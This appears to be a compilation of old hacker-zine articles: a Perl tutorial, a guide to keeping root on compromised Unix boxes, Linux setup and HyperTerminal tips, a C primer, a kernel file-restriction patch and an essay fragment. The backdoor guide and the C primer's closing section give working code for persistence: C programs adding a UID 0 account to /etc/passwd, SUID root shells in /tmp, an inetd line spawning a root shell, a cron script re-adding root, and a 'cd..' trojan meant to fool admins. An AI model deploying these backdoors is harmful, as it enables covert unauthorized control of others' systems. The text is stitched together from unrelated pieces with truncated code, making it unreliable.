      
      $scalar = @array;
      $scalar2 = "@array";
      
      print "$scalar\n";
      print "$scalar2\n";
      print "@array\n";
      print "$array[0] $array[1] $array[2]\n";
      <--> end context.pl
      
      OUTPUT:
      
      Dark@darkness Dark >$ chmod +x context.pl
      Dark@darkness Dark >$ ./context.pl
      3
      23 156 this is an array
      23 156 this is an array
      23 156 this is an array
      Dark@darkness Dark >$
      
      Hrm.. thats strange.. we refered to the same array in different ways, but
      the first line looks different. Why? Lets look at how we use the
      variable.. 
      
      $scalar = @array;
      ...
      print "$scalar\n";
      
      Here, we use @array in numeric context.. and set that value to $scalar.
      When an array name is used in numeric context, it returns the NUMBER OF
      MEMBERS OF THE ARRAY. THIS IS *NOT* THE SUBSCRIPT OF THE LAST ARRAY VALUE.
      The last array value is @array - 1, or can also be obtained as $#array, a
      variable set internally by Perl that holds the subscript of the last array
      member. Ex: $members[$#members] returns the last member of array @members.
      The $#array variable can be increased, decreased, like any other variable,
      but changeing its value ALSO CHANGES THE SIZE OF THE ARRAY. For example:
      
      <++> perl/chsize.pl
      #! /usr/bin/perl
      
      @array = ("one", "two", "three");
      $#array--;
      print "@array\n";
      
      <--> end chsize.pl
      
      OUTPUT:
      
      Dark@darkness Dark >$ chmod +x chsize.pl
      Dark@darkness Dark >$ ./chsize.pl
      one two
      Dark@darkness Dark >$
      
      Notice that the last member of the array is gone, since the array size was
      decreased. 
      
      FUNCTIONS THAT ACT ON VARIABLES:
      
      Ok, now back to hashes.. Many of you might not immediately notice the
      importance of hashes, but lets explore them a bit more. We know that
      hashes are indexed by strings, and we also know that scalars and arrays
      also can hold strings... we can do some nice stuff... things like
      $hash{"$scalar"} returns the hash value indexed with the key of the
      contents of $scalar. 
      
      If we use this convention, we might also need to know which keys exist in
      the hash. This is accomplished by the keys() call. 
      
      SYNTAX: keys(%hash)
              Returns a list of all keys in %hash
      
      for example we can:
      
      @array = keys(%hash);
      
      and then loop through the members of @array, to find all the values in the
      hash. We can also determine whether a key exists in a hash, with the
      exists() call.
      
      SYNTAX: exists($hash{"key"})
              Returns true if key exists in %hash, false otherwise. This is
      commonly used in conditional statements. 
      
      and we can also delete a key from a hash using, you guessed it, the
      delete() call. 
      
      SYNTAX: delete($hash{"key"})
              Deletes key from %hash. After this is done, the value at that key
      will be also lost. 
      
      Scalars and arrays also have the same type of commands:
      
      SYNTAX: defined($scalar), defined(@array);
              Returns true if $scalar or @array exists, false otherwise. Also
      used in conditionals.
      
      SYNTAX: undef($scalar), undef(@array);
              Undefines $scalar or @array. Contents of each will be lost. Undef
      is also used with many Perl functions that returns lists. For example:
      
      (undef, $file) = split(/=/, $scalar, 2);
      
      This split call returns a two member list of values. If we only want the
      second one, we can automatically undefine it, while keeping the second.
      Split will be covered later when we discuss regular expressions and string
      manipulation. 
      
      SYNTAX: $scalar = join("string", @array);
              Converts an array into a single string, by joining all the members
      of the array, separating them by "string". For example:
      
      <++> perl/join.pl
      #! /usr/bin/perl
      @array = ("a", "random", "array", "of", "values", 23);
      $scalar = join("::", @array);
      print "$scalar\n";
      <--> end join.pl
      
      OUTPUT:
      
      Dark@darkness Dark >$ ./join.pl
      a::random::array::of::values::23
      Dark@darkness Dark >$
      
              This function is mainly used to concatenate a whole array into a
      scalar to later print it to a sort of configuration file. Like, you have
      an array returned by getpwent(), and join it to create a copy of the
      /etc/passwd entry.
      
      SPECIAL VARIABLES:
      
              Perl has a LOT of special system variables which are
      automatically set on runtime. These variables control many aspects of the
      program, and also gives the program access to operating system data.
      
      @ARGV : Command line arguments
              Like in many other languages, the @ARGV array holds the arguments
      given after the program name at the command line. Unlike in C, $ARGV[0]
      does NOT hold the program name, it holds the first arguement after the
      program name. The name of the program is held in special varable $0.
      
      <++> perl/argv.pl
      #! /usr/bin/perl
      
      print "$0 @ARGV\n";
      <--> end argv.pl
      
      OUTPUT:
      
      Dark@darkness Dark >$ ./argv.pl this is a test
      ./argv.pl this is a test
      Dark@darkness Dark >$
      
      %ENV : Environment Variables
              This hash holds the names and values of all environment variables
      currently set. For example: $ENV{"PATH"} will return the contents of your
      PATH environment variable. Like any other hash , you can set new values to
      this one. 
      
      $ENV{"TESTER"} = "blah";
      
      This code fragment sets a new environment variable named TESTER to the
      string "blah". The delete(), and exists() functions can also be used on
      this hash.
      
      %SIG : Signals
      
              This hash is Perl's frontend for signal traping. In later volumes,
      we will use referances and this hash to create an unkillable process, and
      timeout counters.
      
      @_ : Default pattern and search space
              
              This is the mother of all Perl special variables. If its used in a
      subroutine, it holds the arguments passed to the sub. If used when reading
      from a file, its set to the data being currently read. If functions that
      regularly require a value to execute have that value ommited, they will
      use the contents of @_. For example:
      
      <++> perl/mother.pl
      #! /usr/bin/perl
      
      $_ = "This is a test\n";
      print;  
      <--> end mother.pl
      
      OUTPUT: 
      
      Dark@darkness Dark >$ chmod +x mother.pl
      Dark@darkness Dark >$ ./mother.pl
      This is a test
      Dark@darkness Dark >$
      
      Just remember, when you arent sure what data a function is working on,
      odds are that it is using @_.
      
      $< : Process UID
      
              Since we all are interested in suid programs (hehe), I decided to
      include this one in the last minute. $< returns the numeric uid of the
      process. Like any other variable, it can be set to other values. For
      example:
      
      $< = 0;
      
      This code frag is identical to doing setuid(0) in C. 
      
      NOTE: Before you start making SUID root programs in Perl, let me warn you
      about something. Perl has a lot of security when it runs suid root, this
      security is called "taintedness". Later we will explore suid root programs
      and tainted variables, but until then, read: man perlsec.
      
      OK, thats all Im going to cover (for now) on Perl variables. I know its
      a long ass section, but you need to know this stuff so you can start
      fooling around with real Perl programs.  
      
      -----------------------------------------------------------------------
      
      
      
      If you havent taken a little break yet, DO IT NOW! Now we are gonna talk
      perl operators....
      
      
      
      -----------------------------------------------------------------------
      
      PERL OPERATORS:
      
      OK.. that mostly covers Perl data types.. now that we are all rested we
      will list many of the basic operators Perl offers.
      
      ++, -- Increment and Decrement. 
              USAGE: $scalar++; ++$scalar; $scalar--; --$scalar;
      
              Increases or decreases the value of $scalar. NOTE: If the operator 
      appears before the variable name, the variable is increased before it is
      used. If the operator is after the variable, it is decremented after the
      variable is used. This is only important if the increment or decrement is
      embedded in other Perl statements. When used alone, it really doesnt
      matter which convention you use. 
      
      *, /, -, +, % Multiplication, Division, Subraction, Addition and Modulo
              USAGE: $scalar = 4 * 25; $scalar = 100 % 13; etc etc..
      
              Performs mathmatical function depending on the symbol. I dont
      really think I need to show many examples of this.... most of you can add
      anyway ;)
              Modulo might be a bit unknown. It returns the remainder of the
      division of the two operands. For example: 5 % 2 return 3, because 5
      divided by 2 is 1 remainder 3. Its most commonly used to print text after
      a set numbers of an iteration of a loop. An example of this will be given
      when we cover conditionals and loops in the next volume. 
      
      ** Exponentiation
              USAGE: $scalar = 5 ** 2; 
      
              Returns the value of the first operand to the power of the second.
      For example: $scalar = 2 ** 16; returns 65356, 2 to the power of 16. 
      
      . Concatenation Operator
              USAGE: $scalar = "string1" . "string2"; $scalar = $var . $var2;
              This operator basically smushes both operators together into one
      string. For example: "one" . "two"; returns "onetwo". This is useful to
      combine the value of different scalars into one. Kinda like strcat() in C.
      
      ------------------------------------------------------------------
      NOTE: The above operators (except ++ and --) can be written in shorthand.
      For example: $var = $var + 20; is equivalent to $var += 20; $var %= 3; is
      equal to $var = $var % 3; $var++; is equal to $var += 1; $var =
      $var . "string"; is equal to $var .= "string"; If you dont notice the
      pattern yet, msg me on IRC or email me =)   
      ------------------------------------------------------------------
      
      
      .. Sequence Operator
              USAGE: @array = (a .. z);
              This is one of my favorite operators, mainly because it turns a
      really long ass line of code into a simple statement. It returns a list of
      all values between the operands. For example:
      
      @array = (a .. z);
      print "@array\n";
      
      This snippet of code prints out: a b c d e f g h i j k l m n o p q r s t u
      v w x y z. All of the values between the operand "a" and the operand "z".
      This also works for numbers, floating point numbers, etc etc. I mostly use
      this in foreach loops, which we will cover next volume.  
      
      x Repetition operator
              USAGE: $scalar = "--" x 2;
              
              Repeats the STRING the number of times shown by the integer. EX:
      "xy" x 3; return "xyxyxy"
       
      
      &&, ||, ! Logical AND, OR, NOT
              These are usually used in conditionals, loops, or error checking.
      These will be discussed in more detail next volume.
      
      &, |, ^, <<, >> Bitwise AND, OR, XOR, Left shift, Right shift
              These operators modify the operands in at the binary level. The
      only time I *EVER* use these is to decode returning codes of a stat()
      call, or for encryption schemes. I wont be covering these, but you can
      read your Perl documentation for more info (man perlop). 
      
              OK, that somewhat covers most of the operators we will be using in our
      tutorials. I left some out, such as ?:, =~, !~, \, ->, and // because they
      will better fit when we discuss their correspondig topics. Play around
      with these operators, some can give you unexpected, but kewl results.. for
      example.. try using ++ and -- on a scalar that holds the string "aa" or
      something similar. 
      
      ---------------------------------------------------------------------------
      
      Alright, that concludes this volume of the Perl tutorial.. I know its
      quite long, but you wont see another one till mid August since Im going on
      vacation (wooohooo). Today we covered:
      
              The 3 types of Perl variables
              How to set variables
              Variable context
              Array sizes
              keys(), exists(), defined(), and other functions that act on
      variables
              Special Perl variables
              Basic Perl operators
      
      Play around with some of the stuff we talked about and you should know
      enough to make simple Perl programs. For example try a line like this
      in your code: 
      
      $scalar = `/bin/date`;
      print "$scalar\n";
      
      (THOSE ARE SINGLE BACK QUOTES)
      
      Perl is a language where EVERYTHING can be done in more than one way, mess
      around with what you already know, and you might come up with something
      cool.

      This article is intended to teach you how to maintain root after you have
      gained it.  It is defenantly from the hackers perspective, but could also
      be viewed at by the Admins perspective, on how to detect these backdoors
      and remove them.  This article is not comprehensive, because their are so
      many ways to leave backdoors i could not possibly cover them all, but i'm
      sure it should explain certain methods and techniques for you to use.
      
      You've been trying to get into this box for a couple weeks, you've got
      your hands on a an acc but the privs are terrible.  The box is known well
      around too be very secure, but now you know just how good the admin is.
      You've tried everything, imap, nis, suid exploits, bad permissions, race
      conditions, but nothing is working.  Finally you stumble onto something
      which the admin overlooked and are quickly sitting on a root shell.  But
      what now? How do you keep this accomplishment you've worked so long on?
      
      
      [Basics]
      
      -1.
      
      You can add a UID 0 account to the passwd file.  This is not recommended
      because when the admin views the file, it will be increadably obvious that
      his box has been compromised, and you will probably lose your root
      position.  Here's a short c prog i wrote which will add a UID 0 acc to
      /etc/passwd.
      
      <++> backdoor/backdoor1.c
      #include 
      
      main()
      {
      FILE *fd;
      fd=fopen("/etc/passwd","a+");
      fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");
      }
      <-->
      
      In a similar attempt you could enable an abondoned account and change it's
      uid to 0 and change the * in the second field.  This method would obviosly
      be less obtrusive than the first
      
      
      Leave a suid shell in /tmp.  Once the file is run you will have root privs
      again, this is everyone favorite but many box's run cronjobs every couple
      hours or when they reboot to clean out tmp, also many box's don't allow
      suid files to be executed.  You can of course remove all these setbacks by
      editing /var/spool/cron/crontabs/root and /etc/fstab.  Here's a little
      program that makes a suid shell called out in /tmp.
      
      <++> backdoor/backdoor2.c
      #include 
      main()
      {
      system("cp /bin/sh /tmp/out");
      system("chown root.root /tmp/out");
      system("chmod 4755 /tmp/out");
      }
      <-->
      
      [Intermediate]
      
      
      The super-server configuration file is not the first place a adminn will
      look, so obviosly is a good place to put a backdoor? But what makes these
      backdoors best, is that their remote, so you don't have to have a local
      account to regain root.  First, some background info: The Internet daemon
      (/etc/inetd) listens for connection requests on TCP and UDP ports and
      spawns the appropriate program (usally a server) when a connection request
      arrives. The format of the /etc/inetd.conf file is simple. Typical lines
      look like this:
      
      (1)     (2)     (3)     (4)     (5)     (6)             (7)
      ftp     stream  tcp     nowait  root    /usr/etc/ftpd   ftpd
      talk    dgram   udp     wait    root    /usr/etc/ntalkd ntalkd
      
      1: This is the daemon name of the servie that appears in /etc/services.
      This tells inetd what to look for in /etc/services to determine which port
      it should associate the program name with. 
      
      2: This will tell inetd what type of connection to use when the session is
      establised . TCP uses streams, and UDP(The connectionless protocol) uses
      datagrams. 
      
      3: Protocol field, TCP or UDP. 
      
      4: This will tell inetd what the importance of the daemon is. A 'wait'
      flag indicates that the server will process a connection and make all
      subsequent connections wait. 'Nowait' means the server will accept a
      connection, spawn a child process to handle the connection, and then go
      back to sleep, waiting for further connections. 
      
      5: Is the user the daemon is run as. 
      
      6: Program to run when a connection arrives.
      
      7: is the actual command (and optional arguments). If the program is
      trivial (usally requiring no user interaction) inetd may handle it
      internally. This is done with an 'internal' flag in fields (6) and (7).
      So, to install a handy backdoor, choose a service that is not used often,
      and replace the daemon that would normally handle it with something else.
      You could make it spawn a program that adds a UID 0 acc, or creates a suid
      shell.
      
      To take over a service like daytime and instead of telling you the time it
      would drop you to a suid root shell, try something like this.
      
      Change the line in /etc/indetd.conf that looks like this:   
      daytime stream  tcp     nowait  root    internal
      
      And change it to: 
      daytime stream  tcp     nowait /bin/sh  sh -i.
      
      Now you've done this, so you decide to go test it out.  You try and it
      says "Unable to establish conection", whats wrong?  Well in order for
      these changes to take place you need to restart inetd, you could wait for
      the box to reboot, but who's patient? Just do a "killalll -9 inetd" and it
      will automatically restart itself.  
      
      Another thing you could do was make a fake service and make it spawn a
      program which would be more secure, such as password protected, and have
      better options, so that you would have the power to modify the system
      further remotley without the dificulties of not running off of telnetd.
      Here is a program that will bind to any port and wait, it will not give a
      prompt, simply put in the password and you will be given a menu of
      options.  This code was written by theft shortly before he left the scene
      so it's might have a few bugs in it as well as some unworking functions.

      Crontab is a very powerfull tool for the admin.  Cron is used to schedule
      jobs to do at certain times of the day, month, or year.  Can you see where
      this is going?  Because of this, you can make a very powerfull backdoor.
      With Cron you could make it spawn a program at say 3:00 am in the morning,
      when the admin is asleep, so you can quickly get in and do as you like and
      get out before he ever notices, it's possibilities are endless. The root
      crontab jobs are located in /var/spool/crontab/root and can be manually
      edited.  The Cron lines will look something like this.
      
      (1)     (2)     (3)     (4)     (5)     (6)
       0       0       *       *       3       /usr/bin/updatedb      
      
      1. Minute  (0-60)
      2. Hour    (0-23)
      3. Day     (1-31) 
      4. Month   (1-12)
      5. Day     (1-7)
      6. is the command (or shell script) to execute. 
      
      The above shell script is executed on Wednesday. To create a backdoor in
      cron just add your custom line to /var/spool/crontab/root. You could make
      a program or shell script in the crontab which checked every week of so if
      the account we created earlier is still in the /etc/passwd.  To start
      this, you would add this line to /var/spool/crontab/root: 
      
      0       0       *       *       *       /usr/bin/retract
      
      <++> backdoor/backdoor.sh
      #!/bin/csh
      # Is our account still alive in /etc/passwd? We'll see.
      
      set evilflag = (`grep eviluser /etc/passwd`)    
      
      
      if($#evilflag == 0) then                        # Is he there?
              
              set linecount = `wc -l /etc/passwd`
              cd                                      # Do this at home.
              cp /etc/passwd ./temppass               # Safety first.

              @ linecount[1] += 1                     # we only want 2 temp files
              split -$linecount[1] ./temppass         # passwd string optional
              echo "Meb::0:0:Meb:/root:/bin/sh" >> ./xaa
              cat ./xab >> ./xaa
              mv ./xaa /etc/passwd
              chmod 644 /etc/passwd                   # or whatever it was beforehand

      You could of course write a trojan and place it in /bin and make the
      program create a suid shell if the right arguments are given.  This is a
      very good trojan if utilized correctly.  You could also replace a little
      used program with your trojan in /bin such as dialog to make your trojan
      even more stealth.  Here's a program which if given the correct agrument
      will create a suid shell in /tmp

      Because the kernel keeps it's paremeters in memory, it is possible for you
      too modify the memory and use it to change you proccess to the UID of 0.
      To do this, /dev/kmem must be world readable and writable.  The program
      below will seek to your page in the memory and change your UID effectively

      [The Clumsy]
      
      
      Have you ever been pounding away working a problem with your box and
      accidently typed "cd.." instead of "cd .." It happens to me because before
      linux I used windows and MS-Dos for years, and the commands are still
      stuck in my head.  Well every now and then, the admin will type that,
      wouldn't you want to take advantage of his mistake? What if when he typed
      cd.. it would trigger your trojan program? Therefore being a semi remote
      backdoor seeing as you don't have to be logged in the box to trigger it,
      the truth is, you can!  Here's a small program I wrote to take advantage
      of human error.
      
      <++> backdoor/dumb.c
      /*
      This program will add a UID 0 account to /etc/passwd
      when the admin accidently types cd..
      Also to cover up itself it will perform the cd action
      so as the admin would never notice his mistake
      */
      
      #include 
      #include 
      
      main()
      {
      FILE *fd;
      fd=fopen("/etc/passwd","a+");
      fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");
      system("cd");
      }
      <-->
      
      Now compile that program and put it somewhere that it looks like it
      belongs.  It is also a good idea if you are doing this from a suid shell
      to change it's ownership by doing "chown root out" if the programs name
      was out, changing the group would also be a good idea, whats the reasoning
      behind this? Well if the admin deos a "ls -alF" and sees a suid root
      program which owner is an unprivileged account, he's going to figure out
      it's a backdoor and remove it.
      
      Ok, now that you've compiled the program(lets say it was called out in
      /bin) then you would do this command to "link" cd.. and /bin/out together,
      do a "ln cd.. /bin/out" and now when the admin makes that vital mistake,
      you'll have access to the system once again.

      Linux SetUp
      
      The setup of the linux os may differ per distro this tut will have the
      basics that will be the same for almost every linux distro.
      It will be divided in a couple of really simple steps, this document will
      not go into configuration of diff. hardware devices etc.. that may differ
      per machine.
      Ok the steps will be the following:
      1. In case you have no bootdisk, you will have to make one.
      In case you DO have a bootdisk WTF ARE YOU DOING IN THIS DOC?
      it is so easy if you already have a bootdisk handy..
      Ok I hope you have windows running b'c it is very handy for  making the
      bootdisk (that is the only actual purpose windows has; u can make linux
      bootdisks pretty easy)
      Ok; if you have the linux os on cd insert the cd into the cd-rom drive.
      Otherwise just go to the dir it is in, now insert a formatted floppy disk
      into our floppy drive (it may also be inserted into the cd-rom drive, but
      i doubt if that will work)
      Now select the right image files for the bootup and put them on the
      floppy,
      if you don't know what files to pick look for a setup text (hehe) or go to
      the website, and go to 'how to setup' (hehe again)
      
      
      2.
      When you have found the right files, insert the bootdisk and bootup.
      You may have to disable your C:/ drive in your BIOS first b'c some
      computers wont read the floppydrive first and they wont boot into the
      linux setup.
      
      
      3. Configure everything, and bootup again and, BEHOLD you have linux
      installed.
      ( i know it looks all very easy but it needs some practice, and you may
      want to make a backup of your C:/ drive in case of partitioning etc..)
      
      Ok I think was about it, I hope you learned something by reading this.
      Have fun and Good luck :)

                                   Hyperterminal trick
                               =-=+=-=+=-=+=-=+=-=+=-=+=-=
      
      What's needed
      ------------------
       -- Two computers 
       -- Two phonelines
       -- Windows HyperTerminal
      
      What are we doing?
      ------------------
              We are connecting two computers via a Windows program called "HyperTerminal." 
      This means you can connect your Windows machine with another even if the other 
      end isn't running Windows. The Linux equivalent is minicom. 
      
      Uses of this.
      ------------------
              This is very useful for transmitting files which are too big to fit on floppy disks, or 
      if you are transmitting from an incompatible media (IE: From a zip disk to a computer which has 
      no zip drive). See if you can find other useful tricks. It's very useful to send files to your 
      friend who aren't on-line, like sending them a patch for a game, etc.
      
      What to do now?
      ----------------------
              
              This goes about double the speed of a normal download. There is only one problem I have 
       found with it, and that is sometimes the computers gets de-synced, (meaning one has sent more 
       than the other can handle and the whole file doesn't get transfered) but that happens very 
       rarely. Well, lets start up your windows hyperterminal program. Set the number to dial 
       accordingly. Now, if you dial that's the easy part, but if you are going to answer you will have 
       to first type the modem init. string which is "ATZ" then you will see *ring* *ring* *ring* and 
       then type the string to make it answer type "ATA" then let it connect. You can chat with your 
       friend but it looks shit, but hey, be thankful for what you get. To send a file click the send 
       file button and use ZMODEM protocol, it's the best. To get a file, just let your bud send it.
       It will automatically start downloading. Be careful though, disable call waiting and try not to 
       step on your phone cords and stuff. This will de-sync it, and that's a bitch when it happens. 
       When it does de-sync, just abort the send and re-send it, you'll see some weird characters on 
       the screen but its perfectly fine. Well that's its, short huh? Well I'm out, remember to have 
       fun now.

      Introduction
      
      Disclaimer:

      gave this to you cannot be held responsible should you choose to use it 
      for malicious purposes.  Remember hackers make things and crackers 
      break them.
      
      Introduction:
              This is intended to be an introduction to C programming for the 
      Linux operating system, which is just a flavor of Unix.  C is a high-
      level programming language, which means that it's written with words 
      like we speak.  In order for your computer to understand the program 
      code it must first be compiled into a binary format.  This will not 
      make you into a C guru or anything, but it should at least get you 
      started on your way into the world of geeks and nerds. ;)
      
      The Basics:
              First let's talk about the structure of a program.  Before 
      anything else you have your header files.  So what exactly are header 
      files you ask?  Well the header of a program is basically telling the 
      program that it needs a certain header (.h) file for at least of one of 
      the functions in the program to work.  A header file contains 
      preprogrammed functions.  If you forget to include stdio.h and use the 
      printf function it won't work because the header for printf (stdio.h) 
      wasn't put in the code.
              After the header of the program you have the body of the program.  
      The body contains functions, which contain statement blocks, which 
      contain statements, which may contain more functions.  Cool eh?
              At any point in the source code of a program there may be 
      remarks.  The beginning of a remark is identified by a forward slash 
      then a star (/*) and the end of a remark is identified by a star then a 
      forward slash (*/).
      /* This is a remark, this is only a remark! */

      The Escape Character (\):
              You will definitely see the escape character in C.  The \ 
      character is the escape character.  When the computer sees the \ it 
      knows that a "special" character is coming right after it.  Here's a 
      few of the characters that may come after the escape character.
      
      Character Description
      \n        The new line character; causes a carriage return and a line 
      feed.
      \b        The backspace character; moves the cursor to the left on 
      space.
      \r        The return character; returns to the beginning of the current 
      line.
      \t        The tab character; moves to the tab stop.
      \f        The form-feed character; goes to the top of a new page.
      
      Getting Down To The Nitty Gritty
      
      Constants, Variables, and Arithmetic Operators:
              A constant is a value that *never* changes.  Whereas a variable 
      can be used to represent different values.  You can think of a variable 
      as a floppy, which is constantly having new data written to it and a 
      constant as a CD that is written one time and isn't ever written over.
              Defining a variable is quite simple.  x = 24; assigns the value 
      24 to the variable x.  x is the variable and 24 is a constant.  You can 
      also assign a different value to x later if you like.  I don't because 
      I lose track, but if you have the memory for it then more power to you. 
      :)
              Arithmetic Operators are symbols.  + - * / % are all arithmetic 
      operators.  You are probably already familiar with some of these.  % 
      was a new one for me.  % is used to get the remainder of the first 
      operand divided by the second operand.
      
      Data Types:
              Each variable has a data type.  Some basic data types are int, 
      char, float, and double.  int stands for the integer data type, char 
      stands for the character data type, float stands for the floating point 
      data type, and double is another way to represent the float data type 
      except that it uses 10 digits of precision.  Each data type has a 
      format specifier.
              The int format specifier can be %d or %i.  The char format 
      specifier is %c.  The float or double format specifier if %f.  One way 
      they can be used is in a printf statement.  You'll learn more about 
      expressions and statements in the next section.
      
      Expressions And Statements:
              An expression is a combination of constants, variables, and 
      operators used to denote a computation.  In the expression a + 5 = c 
      the variable a plus the constant 5 equals the variable c.
              A statement is a set of instructions ended with a semicolon (;), 
      usually ended with a semicolon anyhow.  There are a few functions which 
      don't need a semicolon at the end, such as the for function.  An 
      example of a statement is:
      
      printf("I can write in c\n");
      
              A group of statements make up a statement block.  A statement 
      block starts with an opening brace ({) and ends with a closing brace 
      (}).  Here's an example:
      
      {
      printf("see the opening brace?\n");
      printf("now look at the closing brace.\n");
      }
      
      The Basics Of A Function:
              Well a function may be prewritten and used simply by including 
      the header file for that function or you may write the function 
      yourself.  A function is usually in statement form.
      
      printf("printf() is a function!"\n);
      
              As you can see the function is printf().  The basic function 
      format is the name of the function followed by a pair of left and right 
      parentheses.  Arguments to the function are put in the parentheses.  
      The argument to the statement above was "printf() is a function!".  The 
      arguments may be different depending on your function, but remember 
      type 'man function name' at the prompt to bring up the manual on that 
      function.
      
      Let The Fun Begin
      
      Writing Your First Program:
              We are going to write a simple program to print Hello World! to 
      standard output (your monitor).  So open up your favorite editor 
      (usually pico, emacs, or vi come with Linux).  The standard C compilers 
      are cc or gcc, gcc comes with most distributions of linux.  The syntax 
      is 'gcc file.c -o file'.  Make sure that the file with the code has the 
      .c extension or else it *won't* compile.  I'll include the shell 
      commands just for the inexperienced.
      
      $pico hello.c
      
      <++> basicC/hello.c
      /* This program will print Hello World! */
      #include 
      main()
      {
        printf("Hello World!\n");
        return 0;
      }
      <--> 
      
      $gcc hello.c -o hello
      
              Okay that was fun eh?  Not really you say?!?  Damn you, you 
      ingrate!  Just joking, but I promise I'll get into more fun code later 
      in the paper)  So let's break down this code.
              The first thing is the header, #include , which includes 
      the header file stdio.  Stdio stands for STandarD Input Output.  The 
      double angled brackets (<>) around it mean to look for the header file 
      in a directory other than the current one.  If it had double quotes 
      ("") around it then it would mean to look for the header file in the 
      current directory before looking for it elsewhere.
              The next thing, main(), is the main function of the program.  
      Every C program *must* have a main function.  There are only 2 
      statements inside of the statement block.  The printf statement and the 
      return statement.  The return statement returns the value 0 in this 
      case, which is a true value.  Any other (usually 1) would be a false 
      value.  This is usually used to indicate errors in a program.
      
      Using exit() In A Program:
              Above you learned the return is used to return a value to the 
      program.  In this example we'll use the exit function instead of the 
      return statement.
      
      <++> basicC/exit.c
      /* This will use the exit function instead of return */
      #include 
      #include 
      void main()
      {
        printf("Hello again.\n");
        exit(0);
      }
      <-->
      
       So let's break this down real quick and move on.  You have the header, 
      but wait... what's this?  A new header file?!?  Yep, because the exit 
      function uses the header file stdlib.  Stdlib stands for STandarD 
      LIBrary.  The void data type means that the function won't return a 
      value.  The "the" statement block for main has 2 statements in it.  The 
      printf statement and the exit statement.
      
      Using printf() With Operators:
              So we've seen how to print to standard output.  Now let's try out 
      using putting all the other stuff you learned to use eh?  Check out 
      this example:
      
      <++> basicC/printf.c
      #include 
      
      main()
      {
        int y;
        y = 2 + 5;
        printf(" 2 + 5 = %d\n", y);
        return 0;
      }
      <-->
      
              That one had a bit more meat on it eh?  Okay let's break it down.  
      The only header file is stdio.  The main function is there (of course).  
      Inside of the statement block there are 4 statements.  int y, y = 2 +5, 
      printf, and the return statement.  int y; gives the variable y the int 
      data type.  y = 2 + 5 assigns the value of 2 + 5 to the variable y.  
      The %d in the printf statement means that the %d will be a integer.  
      The \n means newline.  The y after the , in the printf statement means 
      that the integer value of %d is going to be y.  Then the value 0 is 
      returned to the function.
              Now take a look at the character format specifier in a program.  
      Check out this example:
      
      <++> basicC/printf2.c
      #include 
      main()
      {
        char c1, c2;
        c1 = 'h';
        c2 = 'i';
        printf("%c%c\n", c1, c2);
        return 0;
      }
      <-->
      
              By this time I bet you probably have the hang of it.  So I'll 
      just breeze over this one.  Header, main function, the data type of c1 
      and c2 is char, the character h is assigned to c1 and i is assigned to 
      c2.  hi is printed to standard output and the value 0 (true) is 
      returned.
      
      The Shady Side Of It
      
      Making A SUID Backdoor:
              Well first off I'll explain what a SUID is.  SUID stands for Set 
      Used ID.  A Unix machine identifies each user with a number.  The root 
      UID is 0.  Just as with UID there is also a GID, which is your Group 
      ID.  With that in mind let's see a program that'll spawn a rootshell 
      for you. muhahaha :P
      
      <++> basicC/suid.c
      #include 
      #include 
      main()
      {
        setgid(0); setegid(0);
        setuid(0); seteuid(0);
        printf("Root Be Thy Name\n");
        execl("/bin/sh", 0);
        return 0;
      }
      <-->
      
              Okay, okay, now that will give you a root shell if the 
      permissions on the compiled binary file are set correctly, but I'll 
      leave that part out so that I won't be harassed by people for teaching 
      people stuff like that.  The setgid, setegid, setuid, and seteuid 
      functions are used to set the GID, Effective GID, UID, and Effective 
      UID.  The execl function executes the argument ("/bin/sh").  So it made 
      a shell.  You already know that return just returns a value to the 
      function.  To see details check out the manuals yourself ;)
      
      Learning How-To Trojan A SUID:
              So you learned briefly about what SUID's are and the functions 
      that go along with them.  Now obviously a root SUID program is slightly 
      obvious so to further your shady intentions you could get the source to 
      a SUID that's already on the machine and add in some code to spawn you 
      a shell.  This can be done with as few as 10 lines of additional code.
      
      Conclusion
      
      Final Words:
              I know I've left out some stuff and that there's much more to be 
      said on the subject of C programming, but this was only supposed to be 
      an introduction.  I may write another paper on it, but don't hold your 
      breath ;)  Basically with what you've learned here you can at least get 
      your math homework done.  Or make a nifty backdoor.  If you we're 
      disappointed with this paper I don't really care. :)  Please redirect 
      all flames to /dev/null or /dev/echo.  Thanks and have fun!

      ----------[ introduction
      
      	There is no such thing as 100% security, so why act like you are safe 
      	by downloading the latest patches. 'My script automatically downloads 
      	the latest patches and installs them, my box is secure' - right. Why
             	not flip over and say, every process is insecure. Every process got a
      	goal, lets give it permission to accomplish that goal and restrict it
      	as much as possible.
      	
      	Auditfile is a securitypatch i wrote some time ago giving the 
      	oppertunity to restrict the usage of files per process, so we can say
      	
      		-Our httpserver can only
      			read:
      				/usr/local/apache/conf/*
      				/usr/local/apache/htdocs*
      				/usr/local/apache/cgi-bin/*
      			write:
      				/usr/local/apache/logs/*
      			both read and write:
      				/usr/local/apache/cgi-bin/guestbook_database/*
      
      				
      ----------[ how to add those security options
      
      ------------------[ task_struct
      
      	Every process got its own task_struct in the global array of current 
      	tasks (task_list). This task_struct contains things like filename, 
      	environment, uid, gid, euid, and so on. This seems to be the right place
             	to add a
      	
      		char *auditfile; 	// pointing to memory where rules for auditfile are put
      		int auditfile_len;	// integer telling size of memory used for rules for auditfile
      		
      	We can find struct task_struct in /usr/src/linux/include/linux/sched.h 
      	so add that char * and that int to the task_struct.
      	
      	
      ------------------[ How should this memory look like?
      	
      	I came up with the following map of the memory
      	
      	Flags:
      		read = 1
      		write = 2
      		both read and write = 3
      
      	sprintf(buffer_for_auditfile_rules "\0%c%s\0%c%s\0%c%s\0%c%s.....\0\0", flag, match, flag, match, flag, match, flag, match .....");
      
      	Example: 
      		read /usr/bin/*
      		read /lib/*
      		read /etc*
      		both /tmp*
      		write /tmp/write/*
      	
      	would look like
      
      	\0\1/usr/bin/*\0\1/lib/*\0\1/etc*\0\3/tmp*\0\2/tmp/write/*\0\0
      
      	
      ------------------[ how do we get this memory attached to new processes
      	
      	I wrote a little kernel module that allocates memory, fills it with 
      	rules, and attaches that memory to the 
      	task_struct_of_process_to_edit.auditfile, here it is:

     - 1 - Names, PRs and the Media: State of Security Advisories

     When I was at DefCon, I had an interview with a reporter who was doing
     a story on 'hacker handles'. Of course, with a handle like Rain Forest
     Puppy, I was a sure-win. After a 20 minute chat, the last question he
     asked me was "What is your real name?" Of course, my response was "does
     that matter?" Well, to him it did. It seems like it matters to all the
     big, formal media types and vendors. A perfect example of this would be
     the whole RDS saga. Greg Gonzalez's original post gave me credit, since
     he used some of what I talked about in my ODBC advisory posted to Bugtraq
